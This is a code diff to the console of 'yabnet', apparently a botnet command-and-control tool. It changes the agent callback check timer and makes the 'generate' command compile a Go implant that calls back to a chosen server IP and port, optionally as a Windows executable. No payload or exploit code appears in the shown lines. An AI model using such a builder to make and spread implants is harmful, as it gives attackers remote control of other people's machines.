@@ -19,7 +19,9 @@ from cmd2 import ansi
 
 import generator
 
-TIMER = '12'
+# Timer to check the agent's result. The golang agent calls back randomly between 30~40 seconds, so we check 
+# around the 43 second mark. Very janky, very hardcoding indeed. Hopefully I find a better way around this... 
+TIMER = '45'
 
 def refresh():
     while True:
@@ -370,27 +372,24 @@ ___  ___          _              _____                       _
 
     """
     Command: generate 
-    Description: Generate a static agent executable from the golang file 
-
-    TODO: Implement this command 
+    Description: Compile and generate golang agent compile with given server ip address and port. 
     """
     generate_parser = argparse.ArgumentParser()
     generate_parser.add_argument('-i','--ip',type=str, help='IP address of yabnet server the agent calls back to', required=True)
     generate_parser.add_argument('-p','--port',type=str, help='Port number of yabnet server the agent calls back to', required=True)
-    generate_parser.add_argument('-f','--freeze', action="store_true", help='Compile the agent to a fully static executable')
     generate_parser.add_argument('-w','--windows', action="store_true", help='Compile the agent to a windows executable')
     @cmd2.with_category(CUSTOM_CATEGORY)
     @cmd2.with_argparser(generate_parser)
     def do_generate(self, args):
-        self.poutput(ansi.style('[+] Freezing agent file...', fg='green', bold=True))
+        self.poutput(ansi.style('[+] Compiling golang agent file...', fg='green', bold=True))
 
         ip = args.ip
         port = args.port 
-        freeze = args.freeze 
         windowsBool = args.windows
+
         #print(freeze)
 
-        generator.generateNfreeze(ip, port, freeze, windowsBool)
+        generator.goCompile(ip, port, windowsBool)
 
         self.poutput(ansi.style('[+] Generate command executed successfully.', fg='green', bold=True))
 
